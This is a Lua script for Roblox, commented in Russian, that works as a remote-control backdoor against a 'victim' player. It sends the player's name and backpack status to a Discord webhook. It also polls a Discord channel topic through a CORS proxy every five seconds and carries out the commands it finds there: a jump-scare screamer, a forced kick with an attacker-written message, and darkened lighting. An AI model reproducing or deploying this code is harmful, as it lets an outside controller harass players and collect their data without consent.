-- Функция для отправки логов
local function sendLog(title, desc, color)
    pcall(function()
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0x00ffff,
                ["fields"] = {
                    {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
                    {["name"] = "🎒 Вещи", ["value"] = "```" .. (#lp.Backpack:GetChildren() > 0 and "Есть предметы" or "Пусто") .. "```"}
                }
            }}
        }
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if req then req({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

-- Система чтения команд через прокси (читаем описание канала)
task.spawn(function()
    local last_cmd = ""
    while task.wait(5) do
        pcall(function()
            -- Используем прокси, чтобы прочитать данные канала Discord
            local res = game:HttpGet("https://corsproxy.io/?https://discord.com/api/v9/channels/" .. channel_id)
            local data = HttpService:JSONDecode(res)
            local cmd = string.lower(data.topic or "")

            if cmd ~= last_cmd and cmd ~= "" then
                last_cmd = cmd
                
                if string.find(cmd, "screamer") then
                    local g = Instance.new("ScreenGui", lp.PlayerGui)
                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
                    i.Image = "rbxassetid://15518663806"
                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                    task.wait(0.5); g:Destroy()
                    sendLog("😱 СКРИМЕР", "Активирован через описание канала", 0xffffff)

                elseif string.find(cmd, "kick") then
                    local reason = string.match(cmd, "kick%s*%((.*)%)") or "Disconnected"
                    sendLog("💀 КИК", "Причина: " .. reason, 0xff0000)
                    lp:Kick("\n[AxM]\n" .. reason)

                elseif string.find(cmd, "horror") then
                    Lighting.ClockTime = 0
                    sendLog("🌑 УЖАС", "Тьма включена", 0x000000)
                end
            end
        end)
    end
end)

